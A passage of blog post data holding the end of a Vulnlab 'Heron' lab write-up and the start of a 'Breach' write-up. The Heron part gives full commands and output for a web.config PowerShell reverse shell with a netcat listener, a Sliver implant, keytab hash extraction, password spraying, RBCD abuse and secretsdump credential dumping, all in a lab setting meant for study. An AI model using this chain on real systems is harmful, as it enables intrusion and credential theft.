&#x27;(BUILT-IN ADMINISTRATOR PASSWORD)&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">SMB         10.10.128.117   445    MUCDC            [+] heron.vl\\svc-web-accounting-d:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this should return a valid username&#x2F;password combination for <code>svc-web-accounting-d</code>.</p>\n<h1 id=\"Exploiting-the-Accounting-App\"><a href=\"#Exploiting-the-Accounting-App\" class=\"headerlink\" title=\"Exploiting the Accounting App\"></a>Exploiting the Accounting App</h1><p>Note that at this point I took a break in between creating this writeup, so the IP addresses will change. The updated addresses for <code>mucdc.heron.vl</code> and <code>frajmp.heron.vl</code> are <code>10.10.220.53</code> and <code>10.10.220.54</code>.</p>\n<p>Since we have valid credentials for <code>svc-web-accounting-d</code>, I decided to see if we had access to the <code>accounting$</code> SMB share that we saw previously.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\accounting$ -U &#x27;svc-web-accounting-d&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\svc-web-accounting-d]:</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.54:445  ...  OK</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">  .                                   D        0  Fri Jun  7 02:14:04 2024</span><br><span class=\"line\">  ..                                DHS        0  Sun Jun  2 11:26:14 2024</span><br><span class=\"line\">  AccountingApp.deps.json             A    37407  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.dll                   A    89600  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.exe                   A   140800  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.pdb                   A    39488  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.runtimeconfig.json      A      557  Sat Jun  1 18:22:20 2024</span><br><span class=\"line\">  appsettings.Development.json        A      127  Sat Jun  1 18:00:54 2024</span><br><span class=\"line\">  ......</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we successfully were able to gain access to the <code>accounting$</code> share, and there seem to be a lot within the contents of this share.</p>\n<p>There seems to be a consistent notice of this share having contents related to an accounting app, based on the file names. My guess to this is that this could potentially be the configuration directory for the accounting subdomain we found earlier.</p>\n<p>Given that we have access to all of these files, I’m assuming that these will be valid credentials to the simple authentication that this website requires.</p>\n<p><img src=\"/images/vulnlab/heron-vl/g.png\"></p>\n<p>Entering in the credentials for <code>svc-web-accounting-d</code> seems to land us at the respective accounting application. This cements my theory that the SMB share seems to be linked to the backend of this application.</p>\n<p>Given that we have access to the files that build up the accounting app, I’m assuming that we should have RCE if we exploit this appropriately. Let’s take a look further into this share to see if there are any files to exploit.</p>\n<p>After doing a bit of research into this application (finding that this is an IIS application running ASP.NET), the actual exploitation consists of the <code>web.config</code> file that is located on the root directory of this SMB share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;configuration&gt;</span><br><span class=\"line\">  &lt;location path=&quot;.&quot; inheritInChildApplications=&quot;false&quot;&gt;</span><br><span class=\"line\">    &lt;system.webServer&gt;</span><br><span class=\"line\">      &lt;handlers&gt;</span><br><span class=\"line\">        &lt;add name=&quot;aspNetCore&quot; path=&quot;*&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModuleV2&quot; resourceType=&quot;Unspecified&quot; /&gt;</span><br><span class=\"line\">      &lt;/handlers&gt;</span><br><span class=\"line\">      &lt;aspNetCore processPath=&quot;dotnet&quot; arguments=&quot;.\\AccountingApp.dll&quot; stdoutLogEnabled=&quot;false&quot; stdoutLogFile=&quot;.\\logs\\stdout&quot; hostingModel=&quot;inprocess&quot; /&gt;</span><br><span class=\"line\">    &lt;/system.webServer&gt;</span><br><span class=\"line\">  &lt;/location&gt;</span><br><span class=\"line\">&lt;/configuration&gt;</span><br><span class=\"line\">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>This file specifically seems to be related to the runtime arguments that actually define how this application is initialized. As we can see, the <code>aspNetCore</code> module is created by executing <code>AccountingApp.dll</code>, which I’m assuming is then chained to execute all of the other libraries within this directory.</p>\n<p>After doing some research, I found an RCE exploit that we can utilize that uses <code>aspNetCore</code> module that is already present in the configuration file. The resource I used for RCE exploit can be found <a href=\"https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9\">here</a>, all credit goes to Jeroen Verhaeghe.</p>\n<p>If we alter the <code>aspNetCore</code> module to instead use PowerShell as its process path, we can pass in PowerShell arguments into the arguments section within the module. In theory, this should render the website unusable due to the application requiring the serialization of <code>AccountingApp.dll</code>. That being said, it should execute our payload before receiving this error. This was essentially the only way to achieve RCE that I found, I am open to understanding other ways to achieve this without rendering the web application unusable.</p>\n<p>So with that being said let’s replace the module initialization and the actual module itself, I’ve made the necessary changes to the file as seen below (Note that the payload that I’m using is from <a href=\"https://www.revshells.com/\">revshells</a>).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;configuration&gt;</span><br><span class=\"line\">  &lt;location path=&quot;.&quot; inheritInChildApplications=&quot;false&quot;&gt;</span><br><span class=\"line\">    &lt;system.webServer&gt;</span><br><span class=\"line\">      &lt;handlers&gt;</span><br><span class=\"line\">        &lt;add name=&quot;aspNetCore&quot; path=&quot;execute.now&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModuleV2&quot; resourceType=&quot;Unspecified&quot; /&gt;</span><br><span class=\"line\">      &lt;/handlers&gt;</span><br><span class=\"line\">      &lt;aspNetCore processPath=&quot;powershell&quot; arguments=&quot;-e (POWERSHELL BASE64 PAYLOAD)&quot; hostingModel=&quot;OutOfProcess&quot; /&gt;</span><br><span class=\"line\">    &lt;/system.webServer&gt;</span><br><span class=\"line\">  &lt;/location&gt;</span><br><span class=\"line\">&lt;/configuration&gt;</span><br><span class=\"line\">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>The <code>POWERSHELL BASE64 PAYLOAD</code> that I used was the PowerShell #3 Base64 payload from <a href=\"https://www.revshells.com/\">revshells</a>.</p>\n<p>We’ll start up our listener using <code>nc -lvnp 9002</code> and replace the <code>web.config</code> file that is currently in the SMB share with the new changes. You can do so by just removing the current config and putting your new config in the share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; rm web.config</span><br><span class=\"line\">smb: \\&gt; put web.config</span><br><span class=\"line\">putting file web.config as \\web.config (5.8 kb/s) (average 5.8 kb/s)</span><br></pre></td></tr></table></figure>\n\n<p>Let’s now browse to the path that we specified to execute the PowerShell payload, which is <code>http://accounting.heron.vl/execute.now</code>.</p>\n<p>As you can see from the netcat payload, we’ll receive a callback as <code>svc-web-accounting</code> on the DC.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9002      </span><br><span class=\"line\">listening on [any] 9002 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.220.53] 58887</span><br><span class=\"line\">PS C:\\webaccounting&gt; whoami</span><br><span class=\"line\">heron\\svc-web-accounting</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Credential-Hunting-as-svc-web-accounting\"><a href=\"#Credential-Hunting-as-svc-web-accounting\" class=\"headerlink\" title=\"Credential Hunting as svc-web-accounting\"></a>Credential Hunting as svc-web-accounting</h1><p>The interesting part that I found about this is that fact that there is a timeout on the web application that will essentially crash our current reverse shell after about a minute. This isn’t very good practice in the real world, however it’s essentially all that we can do at this with the only POC that I could think of. Again, very open to any different solutions that keep the reverse shell continuously up.</p>\n<p><img src=\"/images/vulnlab/heron-vl/h.png\"></p>\n<p>Luckily enough we can continue to get a reverse shell if we reopen our netcat listener and refresh the <code>execute.now</code> page. Had <code>svc-web-accounting</code> not been kerberoastable and their password WAS crackable, we could simply poison a request to a Responder endpoint and crack their NetNTLMv2 hash.</p>\n<p>Luckily enough, we won’t need this shell for very long. At this point, I enumerated the filesystem in between the intervals of the web application crashing. The <code>C:\\</code> drive seems to be the parent directory of all of the SMB shares. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          6/1/2024   8:10 AM                home</span><br><span class=\"line\">d-----         5/26/2024   2:31 AM                inetpub</span><br><span class=\"line\">d-----          6/6/2024   7:22 AM                it</span><br><span class=\"line\">d-----          5/8/2021   1:20 AM                PerfLogs</span><br><span class=\"line\">d-r---          6/6/2024   7:22 AM                Program Files</span><br><span class=\"line\">d-----          6/1/2024   7:30 AM                Program Files (x86)</span><br><span class=\"line\">d-----         5/26/2024   4:51 AM                transfer</span><br><span class=\"line\">d-r---          6/1/2024   8:43 AM                Users</span><br><span class=\"line\">d-----         6/28/2024  12:38 PM                webaccounting</span><br><span class=\"line\">d-----          6/2/2024   8:26 AM                Windows</span><br><span class=\"line\">-a----          6/2/2024   3:45 AM             36 flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>You can also see that the first flag is within the <code>C:\\</code> drive, meaning we have completed a 1&#x2F;3 of this chain.</p>\n<p>To save some time, I spent a decent amount of attempts looking through all of the folders recursively to see if any DPAPI credentials or really just any credentials were cached in any files. After about an hour of credential hunting, I came across a file within <code>C:\\Windows\\scripts\\ssh.ps1</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\scripts&gt; cat ssh.ps1</span><br><span class=\"line\">$plinkPath = &quot;C:\\Program Files\\PuTTY\\plink.exe&quot;</span><br><span class=\"line\">$targetMachine = &quot;frajmp&quot;</span><br><span class=\"line\">$user = &quot;_local&quot;</span><br><span class=\"line\">$password = &quot;[...snip...]&quot;</span><br><span class=\"line\">&amp; &quot;$plinkPath&quot; -ssh -batch $user@$targetMachine -pw $password &quot;ps auxf; ls -lah /home; exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This seems to contain the SSH password for the <code>_local</code> user. An admin user was probably trying to establish an SSH session to the <code>frajmp</code> jumpbox as this user using PuTTY.</p>\n<p>Now that we have these credentials, we can try to login as this user on the jumpbox. We also won’t need our reverse shell as <code>svc-web-accounting</code> any longer.</p>\n<h1 id=\"Root-Access-to-FRAJMP\"><a href=\"#Root-Access-to-FRAJMP\" class=\"headerlink\" title=\"Root Access to FRAJMP\"></a>Root Access to FRAJMP</h1><p>Now that we have access as this user, we’ll login in our other session as <code>pentest</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest@frajmp:/tmp$ su _local</span><br><span class=\"line\">Password: </span><br><span class=\"line\">_local@frajmp:/tmp$</span><br></pre></td></tr></table></figure>\n\n<p>Testing our root access with the password that we currently have indicates to me that this user has SUDO privileges to the entire filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_local@frajmp:/tmp$ sudo -l</span><br><span class=\"line\">[sudo] password for _local: </span><br><span class=\"line\">Matching Defaults entries for _local on localhost:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User _local may run the following commands on localhost:</span><br><span class=\"line\">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>\n\n<p>Since we have that, we can simply log in as the root user using <code>sudo su</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_local@frajmp:/tmp$ sudo su</span><br><span class=\"line\">root@frajmp:/tmp# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<p>The second flag for this machine is within the root users home directory in <code>/root</code>. There isn’t much to see aside from that, I did some file enumeration and did not come back with much.</p>\n<p>I’ll execute our Sliver implant just to ensure that we have access to the root user through our C2 server. This is just in case we need to tunnel any tools to the DC with the highest privilege on <code>FRAJMP</code>. –&gt; <code>./heron_lin &amp;</code></p>\n<p><img src=\"/images/vulnlab/heron-vl/i.png\"></p>\n<h1 id=\"Pivoting-to-the-DC\"><a href=\"#Pivoting-to-the-DC\" class=\"headerlink\" title=\"Pivoting to the DC\"></a>Pivoting to the DC</h1><p>Now that we have completely compromised the <code>FRAJMP</code> jumpbox, we can extract a very important piece of information on domain-joined Linux machines that I learned to exploit during <a href=\"https://dan-feliciano.com/2024/06/05/hybrid/\">Hybrid</a>.</p>\n<p>There’s a file that exists on domain-joined Linux machines called <code>krb5.keytab</code>, which contains secrets to the machine account. If this file is decrypted, we can view the machine accounts NT hash. This machine account has the potential to have privileges that can lead us to the DC.</p>\n<p>We can use a tool called <a href=\"https://github.com/sosdave/KeyTabExtract\">KeyTabExtract</a> for this. The Python script associated with this allows us to match key values with their encryption types, varying from different types of AES encryption algorithms. Once decrypted with the keytab file (you can download this to your local machine using Sliver), you should receive an output similar to the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 KeyTabExtract/keytabextract.py krb5.keytab </span><br><span class=\"line\">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.</span><br><span class=\"line\">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.</span><br><span class=\"line\">[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.</span><br><span class=\"line\">[+] Keytab File successfully imported.</span><br><span class=\"line\">        REALM : HERON.VL</span><br><span class=\"line\">        SERVICE PRINCIPAL : FRAJMP$/</span><br><span class=\"line\">        NTLM HASH : 6f55b[...snip...]e8254f7</span><br><span class=\"line\">        AES-256 HASH : 7be44e62e24[...snip...]a3050dd586130e7</span><br><span class=\"line\">        AES-128 HASH : dcaae[...snip...]6cbd0cd</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have this machine account we would be able to use it in a variety of different domain escalation tactics if <code>FRAJMP$</code> has any privileges over any other domain objects.</p>\n<p>That being said, we actually are not required to do this. I did some testing with <code>crackmapexec</code> to see if their was any password reusage on the <code>_local</code> user credentials that we have and came back with a successful result to a new user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec smb 10.10.220.53 -u full_ul.txt -p &#x27;(_local PASSWORD)&#x27; --continue-on-success</span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:135  ...  OK</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK</span><br><span class=\"line\">SMB         10.10.220.53    445    MUCDC            [+] heron.vl\\Julian.Pratt:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the <code>Julian.Pratt</code> user seems to have the same password as the <code>_local</code> user on the jumpbox. We can assume that <code>Julian.Pratt</code> (with him being the head of IT) was attempting to try and set up an SSH connection to <code>FRAJMP</code> using PuTTY.</p>\n<p>Since we have access to this user now with his credentials, we can login to his home directory that is being hosted on SMB.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\Julian.Pratt\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sun Jun  2 06:47:14 2024</span><br><span class=\"line\">  ..                                  D        0  Sat Jun  1 11:10:46 2024</span><br><span class=\"line\">  frajmp.lnk                          A     1443  Sun Jun  2 06:47:47 2024</span><br><span class=\"line\">  Is there a way to -auto login- in PuTTY with a password- - Super User.url      A      117  Sat Jun  1 11:44:44 2024</span><br><span class=\"line\">  Microsoft Edge.lnk                  A     2312  Sat Jun  1 11:44:38 2024</span><br><span class=\"line\">  mucjmp.lnk                          A     1441  Sun Jun  2 06:47:33 2024</span><br></pre></td></tr></table></figure>\n\n<p>It seems that this contains a multitude of <code>lnk</code> files that we can pull from this share. We’ll use <code>mget *</code> to read these on our local machine.</p>\n<p><code>frajmp.lnk</code> seems to be partially unreadable, however it contains the plaintext password for <code>_local</code> and <code>Julian.Pratt</code> that we already have. <code>Microsoft Edge.lnk</code> also does not seem to have anything of use to us, containing some directory calls to the Edge application.</p>\n<p>The part of use to us seems to be within <code>mucjmp.lnk</code>, which seems to contain the plaintext password for <code>adm_prju</code> amongst some unreadable text.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat mucjmp.lnk                                                                 </span><br><span class=\"line\">2t▒`��ف+B�� �gP�O� �:i�+00�/C:\\�1�X�sPROGRA~1t  ﾨR�B�X�s.BJz</span><br><span class=\"line\">AProgram Files@shell32.dll,-21781▒P1�X�[PuTTY&lt;  ﾺX�[�X�[.���PuTTY\\2 ��X�� putty.exeD    ﾆX���X�[.putty.exe▒O-N�h�ZC:\\Program Files\\PuTTY\\putty.exe#..\\..\\Program Files\\PuTTY\\putty.exeC:\\Program Files\\PuTTY$adm_prju@mucjmp -pw [...snip...]�&amp;�</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"RBCD-to-MUCDC\"><a href=\"#RBCD-to-MUCDC\" class=\"headerlink\" title=\"RBCD to MUCDC\"></a>RBCD to MUCDC</h1><p>If we look at <code>adm_prju</code>‘s domain node in Bloodhound, we can see that they possess an interesting outbound access control.</p>\n<p><img src=\"/images/vulnlab/heron-vl/j.png\"></p>\n<p>It seems that since <code>adm_prju</code> is within the <code>ADMINS_T1</code> group, they have the <code>WriteAccountRestrictions</code> privilege over the domain controller.</p>\n<p>Having <code>WriteAccountRestrictions</code> means that <code>adm_prju</code> has write access to all of the attributes on the machine, notably <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. If we have the ability to modify this attribute, this means we can abuse resource-based constrained delegation.</p>\n<p>For a small note on what resource-based constrained delegation is, it essentially allows us to request a service ticket for a specified service name to which will be impersonated by a user of our selection. We can then import this service ticket to use for either authentication or credential dumping, depending on the user we impersonate.</p>\n<p>The process for this is relatively simple, as Bloodhound outlines our attach flow in their help page for this specific attack. Note that this requires the user to have control of a machine that has an SPN set, which we currently do since we have control over <code>FRAJMP</code> and it’s NT hash (meaning we’ll just need to PTH with the <code>FRAJMP$</code> NT hash in our commands instead of a password).</p>\n<p>So to start let’s ensure that <code>FRAJMP$</code> can delegate on behalf of <code>MUCDC$</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-rbcd -delegate-from &#x27;FRAJMP$&#x27; -delegate-to &#x27;MUCDC$&#x27; -action &#x27;write&#x27; &#x27;heron.vl/adm_prju:(ADM_PRJU PASSWORD)&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:389  ...  OK</span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)</span><br></pre></td></tr></table></figure>\n\n<p>Now that the jumpbox can delegate on behalf of the domain controller, we can request the TGT with Impacket’s <code>getST</code> tool. This will utilize both <code>S4U2Self</code> and <code>S4U2Proxy</code> to impersonate the specified user and obtain a valid service ticket for that user. </p>\n<p>I found that the Administrator account is disabled and was replaced with <code>_admin</code>, so we’ll request for that user instead. You could also request to impersonate <code>MUCDC$</code>, as we’ll be able to dump credentials with both of those accounts.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-getST -spn &#x27;cifs/mucdc.heron.vl&#x27; -impersonate &#x27;_admin&#x27; &#x27;heron.vl/FRAJMP$&#x27; -hashes :(FRAJMP NT HASH)</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK</span><br><span class=\"line\">[*] Impersonating _admin</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK</span><br><span class=\"line\">[*] Saving ticket in _admin@cifs_mucdc.heron.vl@HERON.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>The ticket should be saved in an appropriate file with a file name specified at the bottom of the command.</p>\n<p>Let’s now set our Kerberos authentication global variable to be directed to this ticket. Note that if you impersonated the <code>MUCDC$</code> machine account, you may need to rename the ticket so that the <code>$</code> special character doesn’t conflict with the global variable setting.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=_admin@cifs_mucdc.heron.vl@HERON.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now we can attempt to dump all of the secrets through our SOCKS proxy using Impacket’s <code>secretsdump</code> command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy so be sure to give it some time.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-secretsdump -k mucdc.heron.vl</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK</span><br><span class=\"line\">[*] Service RemoteRegistry is in stopped state</span><br><span class=\"line\">[*] Starting service RemoteRegistry</span><br><span class=\"line\">[*] Target system bootKey: 0x7a8b61a266b3e6ba7b55725d51f2b723</span><br><span class=\"line\">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class=\"line\">......</span><br><span class=\"line\">_admin:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>You’ll receive more of an output, as Impacket will dump every password hash for domain user and machine account that is cached on the DC. Since we were able to dump the <code>_admin</code> hash, we should be able to simply authenticate to the machine and steal the root flag.</p>\n<p>The only stipulate is that WinRM is not enabled on this machine, and attempting to authenticate to RDP did not work when I tested it initially. We can still simply login to the <code>C$</code> SMB share with our admin hash and view the root flag. You can also use <code>smbexec</code> with the cached Kerberos ticket that we have to gain code execution to the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\C$ -U &#x27;_admin&#x27; --pw-nt-hash (_ADMIN NT HASH)</span><br><span class=\"line\">......</span><br><span class=\"line\">smb: \\&gt; cd Users\\Administrator\\Desktop</span><br><span class=\"line\">smb: \\Users\\Administrator\\Desktop\\&gt; get root.txt</span><br><span class=\"line\">getting file \\Users\\Administrator\\Desktop\\root.txt of size 36 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ cat root.txt  </span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, now that we were able to read the root flag, that means we have compromised this machine!</p>\n<p><img src=\"/images/vulnlab/heron-vl/k.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to xct for the development of this machine, it really helped with strengthening domain-joined Linux attacks. I also have learned to remember to keep things simple, and always to make sure to check every last corner of the filesystems that you have access to.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/t0thkr1s/gpp-decrypt\">https://github.com/t0thkr1s/gpp-decrypt</a><br><a href=\"https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/\">https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/</a><br><a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a><br><a href=\"https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9\">https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9</a></p>\n"},{"title":"Breach - Vulnlab","date":"2024-06-29T04:54:06.000Z","keywords":"Vulnlab, Medium, Windows","description":"Breach in particular was one of the first Vulnlab machines I had tried when I started Vulnlab back in December - though I really didn't know what was going on as I had just started off doing red team labs. Since then, I've done essentially every easy machine on the Vulnlab archive and large amount of seasonal machines on HTB. Hopefully I'll be able to relay this a bit easier this time around.","cover":"/images/vulnlab/breach-vl/breach_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nBreach in particular was one of the first Vulnlab machines I had tried when I started Vulnlab back in December - though I really didn't know what was going on as I had just started off doing red team labs. Since then, I've done essentially every easy machine on the Vulnlab archive and large amount of seasonal machines on HTB. Hopefully I'll be able to relay this a bit easier this time around.\n\n# Enumeration\n\nLet's start out with our usual NMAP scans, just the default.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 17:08 EDT\nNmap scan report for 10.10.101.89\nHost is up (0.13s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n1433/tcp open  ms-sql-s\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 21.40 seconds\n```\n\nWe have a few ports to take a look at here, notably the HTTP server, LDAP, and SMB. Another big thing to mention is that MSSQL seems to be externally facing - which is a vulnerability in of itself. This database and this service should be internal.\n\n![](/images/vulnlab/breach-vl/b.png)\n\nThe HTTP server seems to be a default IIS page, with nothing much else on it. It doesn't seem to be associated with a domain, meaning there's a high chance that we don't need to enumerate for any subdomains.\n\nGobuster didn't seem to return any results either in terms of directory brute-forcing. I couldn't find much aside from this in terms of the IIS server, so we'll move to another service.\n\nIn terms of the domain itself, I found the DNS names for the target machine denoted as `BREACHDC.breach.vl` as seen in the RDP results.\n\n```\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2024-06-10T21:17:12+00:00; +4s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: BREACH\n|   NetBIOS_Domain_Name: BREACH\n|   NetBIOS_Computer_Name: BREACHDC\n|   DNS_Domain_Name: breach.vl\n|   DNS_Computer_Name: BREACHDC.breach.vl\n|   DNS_Tree_Name: breach.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-06-10T21:16:33+00:00\n| ssl-cert: Subject: commonName=BREACHDC.breach.vl\n```\n\nWe can fill these in within our `/etc/hosts` file to make sure that the IP address is resolved to both of these domain names.\n\nIn terms of SMB, it seems that we have access to enumerate multiple shares as seen below.\n\n```\n└─$ smbclient -L 10.10.101.89 -N               \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        share           Disk      \n        SYSVOL          Disk      Logon server share \n        Users           Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.101.89 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nThese specific shares are `share` and `Users`, which we can enumerate for 